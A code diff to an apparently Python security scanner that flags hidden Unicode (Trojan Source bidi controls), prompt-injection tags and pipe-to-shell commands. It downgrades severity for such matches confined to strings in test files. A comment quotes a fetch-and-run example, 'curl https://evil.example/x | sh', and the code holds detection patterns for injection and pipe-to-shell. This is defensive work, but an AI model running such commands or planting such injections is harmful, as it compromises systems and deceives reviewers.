@@ -82,7 +82,8 @@ _REMEDIATION_HINTS: dict[str, str] = {
     ),
     "hidden_unicode": (
         "Remove invisible/bidi/tag Unicode — it can smuggle instructions a human reviewer "
-        "never sees (prompt injection)"
+        "never sees (prompt injection). Where the character is intended (test data), write "
+        "it as an escape (\\u202e) so the source shows it"
     ),
     "prompt_injection": (
         "Remove instruction-override / hidden-directive text from tool descriptions and "
@@ -3132,6 +3133,12 @@ _INJECTION_TAG_ONLY_RE = re.compile(
     r"<\s*/?\s*(?:system|important|instructions?|SYSTEM|IMPORTANT|INSTRUCTIONS?)\s*>")
 
 
+BIDI_TEST_DATA_WHY = (
+    "A bidi control inside a string literal in a test, closed before the string ends, so "
+    "it reorders no code (likely test data). Write it as an escape (\\u202e) so the "
+    "source shows it")
+
+
 def _bidi_cannot_reorder_code(line: str, in_prose: bool, file_lang: str | None) -> bool:
     """A bidi control on a line that carries no code a reviewer reads: an interior line
     of a multi-line string / comment (no quote or comment delimiter on it), or a
@@ -3141,6 +3148,58 @@ def _bidi_cannot_reorder_code(line: str, in_prose: bool, file_lang: str | None) 
     if not in_prose:
         return False
     return not any(d in line for d in ('"""', "'''", "`", "*/", "/*"))
+
+
+_BIDI_OPENS = frozenset("\u202a\u202b\u202d\u202e\u2066\u2067\u2068")
+_BIDI_ISOLATES = frozenset("\u2066\u2067\u2068")
+_BIDI_ALL = _BIDI_OPENS | {"\u202c", "\u2069"}
+
+
+def _bidi_confined_to_literals(line: str, file_lang: str | None) -> bool:
+    """Every bidi control on ``line`` sits inside a one-line string literal, and every
+    embedding / override / isolate it opens is closed (PDF / PDI) before that literal's
+    closing quote. Then the reordering cannot reach code outside the string, which is
+    what Trojan Source needs (an unterminated RLO in ``"a<RLO>b"`` reorders the rest
+    of the line and does NOT qualify). Conservative: a bidi character outside a string,
+    in a comment, or in a string still open at end of line returns False."""
+    hash_comments = file_lang not in ("javascript", "typescript", "go", "rust", "java")
+    in_str: str | None = None
+    stack: list[str] = []
+    escape = False
+    i = 0
+    seen = False
+    while i < len(line):
+        ch = line[i]
+        if in_str is None:
+            if ch in _BIDI_ALL:
+                return False
+            if (ch == "#" and hash_comments) or line.startswith(("//", "/*"), i):
+                return not any(c in _BIDI_ALL for c in line[i:]) and seen
+            if ch in "'\"`":
+                in_str = ch
+        elif escape:
+            escape = False
+        elif ch == "\\":
+            escape = True
+        elif ch == in_str:
+            if stack:
+                return False  # the override leaks past the closing quote
+            in_str = None
+        elif ch in _BIDI_OPENS:
+            stack.append(ch)
+            seen = True
+        elif ch == "\u202c":
+            seen = True
+            if stack and stack[-1] not in _BIDI_ISOLATES:
+                stack.pop()
+        elif ch == "\u2069":
+            seen = True
+            # A PDI closes its isolate and any embedding opened inside it.
+            while stack:
+                if stack.pop() in _BIDI_ISOLATES:
+                    break
+        i += 1
+    return in_str is None and seen and not stack
 
 
 _EXAMPLE_INTRO_RE = re.compile(r"\b(?:example|e\.g\.|for instance)\b[^\"'`]{0,12}$",
@@ -3548,6 +3607,8 @@ def _scan_content(
             return severity, True
         return "medium", False
 
+    # Test code only (not docs / infra): where a sample attack string is test data.
+    test_fixture_file = _is_test_fixture_file(file_path) and not not_test
     is_installer = _is_installer_script(file_path)
     # Per-file language for language-specific pattern dispatch (#2).
     file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
@@ -3741,6 +3802,16 @@ def _scan_content(
                     # line that opens or closes a block comment keeps its severity: the
                     # "commenting-out" variant (`/*<RLO> } <LRI>if (admin)<PDI> */`).
                     effective_severity = "low"
+                remediation = ""
+                if (name.startswith("Bidirectional") and effective_severity == "high"
+                        and not in_comment and test_fixture_file
+                        and idx not in _string_state()[0]
+                        and _bidi_confined_to_literals(line, file_lang)):
+                    # Test data (a path-sanitizer test's unprintable segment): the
+                    # control is closed inside its string, so no code outside the
+                    # literal is reordered. Reported low, with the clean fix.
+                    effective_severity = "low"
+                    remediation = BIDI_TEST_DATA_WHY
                 findings.append(Finding(
                     category="hidden_unicode",
                     name=name,
@@ -3748,6 +3819,7 @@ def _scan_content(
                     file_path=file_path,
                     line_number=idx + 1,
                     snippet=stripped[:120],
+                    remediation=remediation,
                 ))
                 break
 
@@ -4336,6 +4408,18 @@ def _scan_content(
                         and _in_string_literal_at(line, dm.start())
                         and not _file_has_exec_sink()):
                     effective_severity, remote_payload = "medium", False
+                # ...and one naming only a reserved domain (`curl https://evil.example/x |
+                # sh`, a planted prompt-injection string a grader test must reject) can
+                # fetch nobody's script: low, even if the test file spawns processes.
+                # Shell scripts keep the rule above.
+                reserved_why = ""
+                if (name == pipe_shell.PIPE_TO_SHELL and test_fixture_file
+                        and effective_severity in ("critical", "high", "medium")
+                        and Path(file_path).suffix.lower() not in _SHELL_PAYLOAD_EXTS
+                        and _in_string_literal_at(line, dm.start())
+                        and pipe_shell.reserved_hosts_only(line, pattern, file_path)):
+                    effective_severity, remote_payload = "low", False
+                    reserved_why = pipe_shell.WHY_RESERVED_TEST
                 npx_pre = None
                 if name.startswith("Unpinned npx") and _npx_not_a_load(
                         file_path, line, dm.start(),
@@ -4456,7 +4540,7 @@ def _scan_content(
                     line_number=line_num,
                     snippet=stripped[:120],
                     payload=remote_payload,
-                    remediation=pipe_shell.why(pipe_class),
+                    remediation=reserved_why or pipe_shell.why(pipe_class),
                 )
                 if npx_pre is not None:
                     # What it would have been (not a dataclass field): repository,
